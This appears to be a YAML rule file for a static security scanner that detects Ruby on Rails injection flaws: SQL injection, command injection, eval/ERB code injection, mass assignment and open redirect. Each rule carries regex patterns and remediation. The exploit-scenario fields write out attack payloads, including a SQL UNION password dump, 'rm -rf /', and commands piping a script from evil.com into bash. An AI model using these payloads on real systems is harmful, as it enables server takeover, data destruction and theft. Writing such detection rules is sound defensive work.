rules:
- rule_id: RUBY-INJ-001
  title: SQL Injection via String Interpolation in ActiveRecord
  description: 'Detects ActiveRecord queries using string interpolation with user-controlled input instead of parameterized
    conditions.

    '
  language: ruby
  category: injection
  severity: Critical
  confidence: 0.93
  cwe: CWE-89
  owasp: A03:2021-Injection
  tags:
  - sql-injection
  - active-record
  - rails
  - sequel
  - arel
  patterns:
  - type: regex
    pattern: \.where\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: \.(?:find_by_sql|select|joins|order|group|having|from)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: \.execute\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: \.where\s*\(\s*['"][^'"]*["']\s*\+\s*(?:params|request|input|user)\b
  - type: regex
    pattern: \.(?:pluck|count|sum|average|minimum|maximum)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: ActiveRecord::Base\.connection\.(?:execute|select_all|select_one|select_value)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input)\b
  - type: regex
    pattern: \.(?:order|reorder|group)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  anti_patterns:
  - .where(.*:.*)
  - .where(.*?.*)
  - sanitize_sql
  - Arel
  - '.where(name: params['
  - quote(
  - sanitize_sql_for_conditions
  - sanitize_sql_array
  - sanitize_sql_like
  - ActiveRecord::Base.connection.quote
  - bind(
  context_awareness:
    surrounding_context_patterns:
    - class.*<.*ApplicationController
    - class.*<.*ActiveRecord::Base
    - class.*<.*ApplicationRecord
    - Rails.application
    - require.*active_record
    - include ActiveModel
    - def index
    - def show
    - def create
    - def update
    taint_source_indicators:
    - params[
    - params.permit
    - request.params
    - request.query_string
    - request.body
    - request.raw_post
    - cookies[
    - session[
    - request.headers[
    taint_sink_indicators:
    - .where(
    - .find_by_sql(
    - .execute(
    - .select(
    - .joins(
    - .order(
    - .group(
    - .having(
    - .from(
    - .pluck(
    - connection.execute(
    sanitization_patterns:
    - sanitize_sql
    - quote(
    - Arel.sql
    - bind(
    - ActiveRecord::Base.connection.quote
    - sanitize_sql_like
    - 'where(key: value)'
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + data_sensitivity_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'An attacker sends a request to GET /users?name=admin'' OR ''1''=''1 to a Rails controller that uses User.where("name
      = ''#{params[:name]}''"), bypassing authentication and dumping all user records.

      '
    example_payload: admin' UNION SELECT username, password FROM users--
    attacker_objective: Exfiltrate database content, bypass authentication, modify or delete records, or escalate to OS command
      execution via database functions.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'SQL injection via ActiveRecord string interpolation bypasses ORM protections.

    Rails applications are especially susceptible when developers use raw SQL strings

    with interpolation instead of parameterized conditions. Can lead to full database

    compromise, data exfiltration, and in some database configurations, remote code

    execution.

    '
  remediation: "Framework-specific fixes:\n  - Rails ActiveRecord: use parameterized conditions\n      User.where(\"name =\
    \ ?\", params[:name])\n      User.where(name: params[:name])\n  - Rails with Arel: use Arel predicates\n      users =\
    \ User.arel_table\n      User.where(users[:name].eq(params[:name]))\n  - Sequel ORM: use dataset filtering\n      DB[:users].where(name:\
    \ params[:name])\n  - Raw SQL: use sanitize_sql_array\n      User.where(sanitize_sql_array([\"name = ?\", params[:name]]))\n\
    Secure libraries:\n  - ActiveRecord parameterized where clauses\n  - Arel query builder for complex queries\n  - Sequel\
    \ ORM with built-in escaping\n  - Rails sanitize_sql_* helper methods\nPrevention strategies:\n  - Never use string interpolation\
    \ in SQL fragments\n  - Use strong_parameters to whitelist allowed attributes\n  - Enable Brakeman static analysis in\
    \ CI/CD pipeline\n  - Review raw SQL usage in code reviews\n  - Use database roles with minimal privileges\n"
  references:
  - https://cwe.mitre.org/data/definitions/89.html
  - https://rails-sqli.org/
  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - RUBY-INJ-002
    - RUBY-INJ-003
    - TS-INJ-001
    - KOTLIN-INJ-001
  detection_layer: 1
- rule_id: RUBY-INJ-002
  title: Command Injection via Kernel System Methods
  description: 'Detects use of system, exec, backticks, or %x with user-controlled input in Ruby applications.

    '
  language: ruby
  category: injection
  severity: Critical
  confidence: 0.94
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - kernel-system
  - rce
  - backticks
  - open3
  patterns:
  - type: regex
    pattern: (?:system|exec|spawn)\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: '`[^`]*#\{[^}]*(?:params|request|input|user)\b[^`]*`'
  - type: regex
    pattern: '%x\[[^\]]*#\{[^}]*(?:params|request|input|user)\b'
  - type: regex
    pattern: (?:IO|Open3)\.popen\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: Kernel\.(?:system|exec)\s*\(\s*(?:params|request|input|user)\b
  - type: regex
    pattern: '%x\([^)]*#\{[^}]*(?:params|request|input|user)\b'
  - type: regex
    pattern: Process\.spawn\s*\(\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
  - type: regex
    pattern: (?:system|exec|spawn)\s*\(\s*(?:params|request|input|user)\b
  anti_patterns:
  - Shellwords.escape
  - shellescape
  - Shellwords.shellescape
  - system(*
  - capture3(
  - Open3.capture3
  - '# nosec'
  - allowlist
  - whitelist
  - ALLOWED_COMMANDS
  context_awareness:
    surrounding_context_patterns:
    - class.*<.*ApplicationController
    - require.*open3
    - require.*shellwords
    - class.*Job
    - class.*Worker
    - class.*Service
    - def perform
    taint_source_indicators:
    - params[
    - request.params
    - ARGV
    - gets
    - readline
    - ENV[
    - cookies[
    - request.body
    - request.headers[
    taint_sink_indicators:
    - system(
    - exec(
    - spawn(
    - backticks
    - '%x['
    - '%x('
    - IO.popen(
    - Open3.popen3(
    - Process.spawn(
    - Kernel.system(
    - Kernel.exec(
    - fork { exec
    sanitization_patterns:
    - Shellwords.escape
    - shellescape
    - Shellwords.shelljoin
    - system(command, arg1, arg2)
    - allowlist.include?
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_escalation_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Rails application has a controller action that converts files: system("convert #{params[:filename]}
      output.png"). An attacker submits filename="; rm -rf / #" causing arbitrary command execution on the server.

      '
    example_payload: file.txt; curl http://evil.com/shell.sh | bash
    attacker_objective: Execute arbitrary OS commands to gain remote code execution, exfiltrate data, install backdoors, or
      pivot to internal networks.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'Remote code execution through shell metacharacter injection. An attacker

    can execute arbitrary operating system commands with the privileges of the

    Ruby application process, potentially gaining full control of the server,

    reading sensitive files, pivoting to internal networks, or installing

    persistent backdoors.

    '
  remediation: "Framework-specific fixes:\n  - Rails: avoid system() calls in controllers; use background jobs with validated\
    \ arguments\n  - General: pass command and arguments as separate array elements\n      system(\"convert\", params[:filename],\
    \ \"output.png\")\n  - Sidekiq/Resque: validate all job arguments before processing\nSecure libraries:\n  - Shellwords.escape()\
    \ for argument escaping\n  - Open3.capture3 with array arguments for safe subprocess execution\n  - Terrapin/Cocaine gem\
    \ for safe command line execution\n  - posix-spawn gem for safe process spawning\nPrevention strategies:\n  - Pass command\
    \ and arguments as separate array elements to system()\n  - Use Open3.capture3(\"command\", \"arg1\", \"arg2\") with explicit\
    \ arguments\n  - Validate input against strict allowlists of permitted values\n  - Never concatenate user input into command\
    \ strings\n  - Run processes in sandboxed environments with minimal privileges\n  - Enable Brakeman command injection\
    \ checks in CI/CD pipeline\n"
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - RUBY-INJ-001
    - RUBY-INJ-003
    - CPP-INJ-001
    - RUST-INJ-002
  detection_layer: 1
- rule_id: RUBY-INJ-003
  title: Unsafe ERB/eval with User Input
  description: 'Detects ERB template rendering or eval with user-controlled content, enabling arbitrary Ruby code execution.

    '
  language: ruby
  category: injection
  severity: Critical
  confidence: 0.91
  cwe: CWE-94
  owasp: A03:2021-Injection
  tags:
  - code-injection
  - erb
  - eval
  - rce
  - metaprogramming
  - send
  patterns:
  - type: regex
    pattern: \beval\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: ERB\.new\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: instance_eval\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: class_eval\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: send\s*\(\s*(?:params|request|input|user)\b
  - type: regex
    pattern: module_eval\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: binding\.eval\s*\(\s*(?:params|request|input|user|data)\b
  - type: regex
    pattern: (?:const_get|const_set)\s*\(\s*(?:params|request|input|user)\b
  anti_patterns:
  - '# nosec'
  - sanitize
  - ALLOWED_METHODS
  - respond_to?
  - method_defined?
  - public_send
  - whitelist
  - allowlist
  - SafeERB
  - Erubi
  context_awareness:
    surrounding_context_patterns:
    - class.*<.*ApplicationController
    - class.*<.*ActiveRecord::Base
    - require.*erb
    - module.*Helper
    - class.*Mailer
    - class.*Service
    - before_action
    taint_source_indicators:
    - params[
    - request.body
    - request.params
    - cookies[
    - session[
    - request.raw_post
    - gets
    - ARGV
    - request.headers[
    taint_sink_indicators:
    - eval(
    - instance_eval(
    - class_eval(
    - module_eval(
    - binding.eval(
    - ERB.new(
    - send(
    - public_send(
    - const_get(
    - __send__(
    - method(
    sanitization_patterns:
    - ALLOWED_METHODS.include?
    - respond_to?
    - method_defined?
    - public_method_defined?
    - allowlist
    - whitelist.include?
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1 + direct_rce_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Rails application has an admin panel that evaluates user-provided Ruby expressions for a reporting
      feature: eval(params[:expression]). An attacker submits expression=`cat /etc/passwd` to read system files, or system(''curl
      evil.com/backdoor.sh|bash'') to install a backdoor.

      '
    example_payload: system('curl http://evil.com/shell.sh | bash')
    attacker_objective: Achieve arbitrary Ruby code execution to fully compromise the server, steal credentials, pivot to
      internal systems, or establish persistent access.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'Arbitrary Ruby code execution via eval or dynamic template rendering.

    This is the most severe class of vulnerability: attackers can execute any

    Ruby code, read/write files, access databases, make network requests,

    and completely compromise the application and underlying server.

    '
  remediation: "Framework-specific fixes:\n  - Rails: use pre-compiled ERB templates from the views directory; never render\
    \ user-provided templates\n  - Sinatra: use layout/template system instead of dynamic ERB construction\n  - Background\
    \ jobs: validate method names against explicit allowlists before send()\nSecure libraries:\n  - Erubi gem (safe ERB engine\
    \ with auto-escaping)\n  - Liquid templating engine for user-provided templates (sandboxed)\n  - Mustache for logic-less\
    \ user-controlled templates\nPrevention strategies:\n  - Never use eval() with user input under any circumstances\n  -\
    \ Use pre-compiled ERB templates loaded from files, not user data\n  - Replace send() with explicit method calls or strict\
    \ allowlists\n  - Use a strict allowlist for permitted methods when dynamic dispatch is required\n  - Use public_send\
    \ instead of send and validate method names against respond_to?(:method, false)\n  - Apply the principle of least privilege:\
    \ run application with minimal OS permissions\n  - Use Ruby's $SAFE level or Sandboxing for untrusted code (note: $SAFE\
    \ is deprecated in Ruby 3.x)\n"
  references:
  - https://cwe.mitre.org/data/definitions/94.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - RUBY-INJ-001
    - RUBY-INJ-002
    - TS-INJ-002
  detection_layer: 1
- rule_id: RUBY-INJ-004
  title: Mass Assignment / Strong Parameters Bypass
  description: 'Detects ActiveRecord models and controller actions that permit unprotected attribute assignment from user-controlled
    input, allowing attackers to set privileged fields such as admin flags, role columns, account balances, or foreign keys
    by injecting unexpected parameters into create or update calls.

    '
  language: ruby
  category: injection
  severity: High
  confidence: 0.88
  cwe: CWE-915
  owasp: A04:2021-Insecure Design
  tags:
  - mass-assignment
  - strong-parameters
  - attr-accessible
  - rails
  - active-record
  - privilege-escalation
  detection_layer: 2
  attack_surface_type: HTTP parameter binding
  patterns:
  - type: regex
    pattern: \.(?:create|new|update|update_attributes|assign_attributes)\s*\(\s*params\b
    description: Direct use of raw params hash in model create/update without permit filtering
  - type: regex
    pattern: \.(?:create|new|update)\s*\(\s*request\.params\b
    description: Direct use of request.params in model persistence methods
  - type: regex
    pattern: params\.permit!\s*
    description: Blanket permit-all call that bypasses strong parameter protections entirely
  - type: regex
    pattern: params\.permit\s*\(\s*!\s*\)
    description: Alternative permit! invocation pattern that whitelists every parameter
  - type: regex
    pattern: attr_accessible\s*$
    description: Empty attr_accessible declaration in legacy Rails that leaves all attributes writable
  - type: regex
    pattern: config\.action_controller\.permit_all_parameters\s*=\s*true
    description: Global application config that disables strong parameters protection across all controllers
  - type: regex
    pattern: \.update_attribute\s*\(\s*(?:params|request|input|user)\b
    description: update_attribute (singular) skips validations and mass-assignment protections
  - type: regex
    pattern: \.(?:create|update|new)\s*\(\s*params\.to_unsafe_h
    description: Explicit conversion of params to an unsafe hash bypassing strong parameters
  anti_patterns:
  - params.require(
  - .permit(
  - strong_parameters
  - attr_accessible :name
  - attr_protected
  - StrongParameters
  - ActionController::Parameters
  - permitted?
  - slice(
  - only(
  bypass_variants:
  - description: Using JSON.parse on request body to circumvent strong parameters
    pattern: JSON\.parse\s*\(\s*request\.(?:body|raw_post)\b.*\.(?:create|update)
  - description: Merging user input with a base hash to sneak in extra attributes
    pattern: \.merge\s*\(\s*params\b.*\.(?:create|update|save)
  - description: Using Hash#symbolize_keys or to_h on params to evade permit checks
    pattern: params\.(?:to_h|to_hash|symbolize_keys)\b
  evasion_indicators:
  - params.to_unsafe_hash
  - params.to_h
  - ActionController::Parameters.new(request.body)
  - JSON.parse(request.raw_post)
  encoding_variants:
  - type: nested_parameter_injection
    pattern: params\[.*\]\[.*(?:admin|role|is_admin|privilege|permission)\b
  - type: array_wrapping
    pattern: params\.permit\(.*\[\]\s*\)
  multi_function_chain_patterns:
  - \.new\s*\(\s*params\b.*\.save
  - params\.merge\(.*\).*\.(?:create|update|save)
  privilege_context_flags:
    requires_auth_context: true
    admin_only_risk: true
    escalation_vector: Horizontal and vertical privilege escalation by setting role, admin, or permission attributes via unprotected
      mass assignment
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: params[:user] or request.params
    sink: User.create() / User.update()
    through: Controller action without params.require().permit() filtering
  - source: JSON.parse(request.body.read)
    sink: Model.new(parsed_data).save
    through: Manual JSON deserialization bypassing strong parameters
  impact: 'Mass assignment allows attackers to modify any model attribute by injecting

    unexpected parameters in HTTP requests. This can lead to vertical privilege

    escalation (setting admin=true), horizontal privilege escalation (changing

    user_id foreign keys), financial manipulation (modifying balance or price

    columns), data corruption (overwriting audit timestamps), and bypassing

    business logic constraints. In Rails applications prior to version 4.0,

    all attributes were mass-assignable by default, and even in modern Rails,

    misuse of params.permit! or to_unsafe_hash reintroduces the vulnerability.

    '
  remediation: "Framework-specific fixes:\n  - Rails 4+: always use strong parameters with explicit permit lists\n      def\
    \ user_params\n        params.require(:user).permit(:name, :email, :password)\n      end\n      User.create(user_params)\n\
    \  - Rails 3.x: use attr_accessible in models with explicit attribute lists\n      class User < ActiveRecord::Base\n \
    \       attr_accessible :name, :email, :password\n      end\n  - API controllers: parse and validate JSON bodies through\
    \ strong parameters\n      def api_params\n        ActionController::Parameters.new(JSON.parse(request.body.read))\n \
    \         .require(:user).permit(:name, :email)\n      end\nSecure libraries:\n  - ActionController::StrongParameters\
    \ (built into Rails 4+)\n  - Pundit or CanCanCan for attribute-level authorization\n  - dry-validation for schema-level\
    \ input validation\n  - ActiveModel::Serializers for controlling attribute exposure\nPrevention strategies:\n  - Never\
    \ pass raw params directly to create, update, or new\n  - Never use params.permit! in production code\n  - Define separate\
    \ permit lists for different user roles (admin vs regular user)\n  - Use Brakeman mass_assignment check in CI/CD pipeline\n\
    \  - Audit models for sensitive columns (role, admin, balance, permissions)\n  - Add integration tests that verify unpermitted\
    \ attributes are rejected\n  - Consider using Form Objects or Service Objects to decouple input handling\n"
  references:
  - https://cwe.mitre.org/data/definitions/915.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
  - https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters
  context_awareness:
    surrounding_context_patterns:
    - class.*<.*ApplicationController
    - class.*<.*ActionController::Base
    - class.*<.*ActionController::API
    - class.*<.*ApplicationRecord
    - class.*<.*ActiveRecord::Base
    - def create
    - def update
    - before_action
    taint_source_indicators:
    - params[
    - params.require
    - request.params
    - request.body
    - request.raw_post
    - JSON.parse(request
    - params.to_unsafe_hash
    - params.permit!
    taint_sink_indicators:
    - .create(
    - .new(
    - .update(
    - .update_attributes(
    - .assign_attributes(
    - .update_attribute(
    - .build(
    - .create!(
    - .update!(
    - .save
    sanitization_patterns:
    - params.require(
    - .permit(
    - attr_accessible
    - attr_protected
    - permitted?
    - slice(
    - only(
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: severity_weight * confidence * (1 + privilege_escalation_factor + data_sensitivity_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Rails application has a registration endpoint that calls User.create(params[:user]) without strong
      parameter filtering. An attacker sends a POST request with user[admin]=true or user[role]=superadmin in the request
      body, setting privileged attributes on their newly created account and gaining administrative access to the entire application.

      '
    example_payload: 'POST /users { user: { name: ''attacker'', email: ''a@evil.com'', admin: true, role: ''superadmin'' }
      }'
    attacker_objective: Escalate privileges to administrator level, modify financial attributes like account balance, or change
      ownership of records by overwriting foreign key columns.
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  metadata:
    rule_version: 3.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - RUBY-INJ-001
    - RUBY-INJ-005
    - RUBY-INJ-003
- rule_id: RUBY-INJ-005
  title: Open Redirect via redirect_to with User-Controlled URL
  description: 'Detects instances where Rails redirect_to is called with a URL derived from user-controlled input such as
    params, request headers, or cookie values, enabling attackers to redirect authenticated users to malicious phishing sites
    that harvest credentials or serve malware while appearing to originate from a trusted domain.

    '
  language: ruby
  category: injection
  severity: Medium
  confidence: 0.85
  cwe: CWE-601
  owasp: A01:2021-Broken Access Control
  tags:
  - open-redirect
  - phishing
  - redirect-to
  - rails
  - url-validation
  - oauth-bypass
  detection_layer: 2
  attack_surface_type: HTTP response manipulation
  patterns:
  - type: regex
    pattern: redirect_to\s*\(?\s*params\[.*\]
    description: Direct redirect_to using a parameter value as the target URL
  - type: regex
    pattern: redirect_to\s*\(?\s*(?:request\.referer|request\.referrer)\b
    description: Redirect based on the Referer header which is fully attacker-controlled
  - type: regex
    pattern: redirect_to\s*\(?\s*(?:URI|URI\.parse)\s*\(\s*params\b
    description: Redirect using URI.parse on user input which does not validate the host
  - type: regex
    pattern: redirect_to\s*\(?\s*"[^"]*#\{[^}]*(?:params|request|input|user)\b
    description: Redirect URL constructed via string interpolation with user input
  - type: regex
